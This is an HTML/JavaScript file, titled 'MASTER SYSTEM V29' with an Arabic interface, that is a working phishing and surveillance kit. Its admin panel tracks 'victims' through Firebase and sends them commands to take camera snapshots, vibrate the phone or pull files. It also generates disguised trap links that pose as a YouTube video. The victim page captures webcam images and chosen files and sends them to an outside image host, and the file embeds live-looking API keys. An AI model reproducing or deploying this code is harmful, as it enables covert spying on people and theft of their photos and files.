<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MASTER SYSTEM V29</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; }
        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; }
        #admin-panel { display: block; padding: 15px; }
        .radar-box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: #050505; border-radius: 10px; }
        .v-card { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #0a0a0a; }
        .v-card.selected { border-color: #fff; background: #111; box-shadow: 0 0 10px var(--neon); }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; font-weight: bold; cursor: pointer; }
        input { width: 100%; padding: 10px; background: #000; border: 1px solid var(--neon); color: #0ff; margin-bottom: 10px; box-sizing: border-box; }
        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top:0; width:100%; background:#000; z-index:9999; }
        .play-btn { width: 100px; height: 100px; border: 5px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content: ''; position: absolute; top: 25px; left: 38px; border-left: 35px solid #fff; border-top: 25px solid transparent; border-bottom: 25px solid transparent; }
    </style>
</head>
<body>

<div id="admin-panel">
    <div class="radar-box">
        <h3>📡 الرادار النشط:</h3>
        <div id="v-list">بانتظار النبض...</div>
    </div>
    <div class="radar-box">
        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">--</span></h3>
        <div class="btn-grid">
            <button onclick="cmd('snap')">📸 سحب صورة</button>
            <button onclick="cmd('vibrate')" style="color:yellow;">📳 هز الهاتف</button>
            <button onclick="cmd('pick')" style="color:cyan;">📂 سحب ملفات</button>
            <button onclick="cmd('release')" style="color:#0f0;">🔓 إطلاق سراح</button>
        </div>
        <button onclick="db.ref('victims').remove()" style="color:red; width:100%; margin-top:15px; border-color:red;">🗑️ تنظيف الرادار</button>
    </div>
    <div class="radar-box">
        <input type="text" id="target-url" placeholder="رابط التمويه (YouTube)">
        <button onclick="gen()" style="width:100%;">توليد رابط الفخ</button>
        <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
    </div>
</div>

<div id="vic-panel">
    <div class="play-btn" onclick="startSystem()"></div>
    <p style="color:#fff; margin-top:20px;">Tap to Play Video</p>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<script>
    // --- المفاتيح والمحركات ---
    const IMGBB_API = "657662c1253a66974d09325996b27e8a"; // مفتاح imgBB الخاص بك
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    const params = new URLSearchParams(window.location.search);
    const vParam = params.get('v');

    if (vParam) {
        document.getElementById('admin-panel').style.display = 'none';
        document.getElementById('vic-panel').style.display = 'flex';
        initVictim(atob(vParam));
    } else {
        initAdmin();
    }

    // --- وظائف الإدارة ---
    function initAdmin() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list'); list.innerHTML = '';
            if(!s.exists()) { list.innerHTML = "الرادار يبحث..."; return; }
            s.forEach(child => {
                const v = child.val(); const id = child.key;
                const online = (Date.now() - v.lastSeen) < 10000;
                list.innerHTML += `<div class="v-card ${id === selId ? 'selected' : ''}" onclick="sel('${id}','${v.model}')">
                    <span>📱 ${v.model}</span>
                    <span style="color:${online ? '#0f0' : '#444'}">${online ? '● نشط' : '● غائب'}</span>
                </div>`;
            });
        });
    }
    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
    function cmd(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
    function gen() {
        const u = document.getElementById('target-url').value;
        if(!u) return alert("ضع رابطاً!");
        document.getElementById('res-link').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
    }

    // --- وظائف الضحية والرفع ---
    let vRef = null;
    function initVictim(target) {
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "Mobile Device";
        vRef = db.ref('victims').push();
        const pulse = () => vRef.update({ model: model, lastSeen: Date.now() });
        pulse(); setInterval(pulse, 3000);

        db.ref('victims/' + vRef.key + '/cmd').on('value', s => {
            const c = s.val(); if(!c) return;
            if(c.t === 'snap') take();
            if(c.t === 'vibrate') navigator.vibrate(500);
            if(c.t === 'pick') document.getElementById('f-in').click();
            if(c.t === 'release') window.location.href = target;
        });
    }

    async function startSystem() { await take(); }

    async function take() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
            upload(data);
            s.getTracks().forEach(t => t.stop());
        } catch(e) { console.log(e); }
    }

    function upload(base64) {
        let form = new FormData();
        form.append("image", base64);
        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API}`, { method: "POST", body: form })
        .then(res => res.json())
        .then(res => { vRef.child('photos').push(res.data.url); })
        .catch(err => console.log(err));
    }

    document.getElementById('f-in').onchange = (e) => {
        for(let f of e.target.files) {
            const r = new FileReader();
            r.onload = (ev) => upload(ev.target.result.split(',')[1]);
            r.readAsDataURL(f);
        }
    };
</script>
</body>
</html>
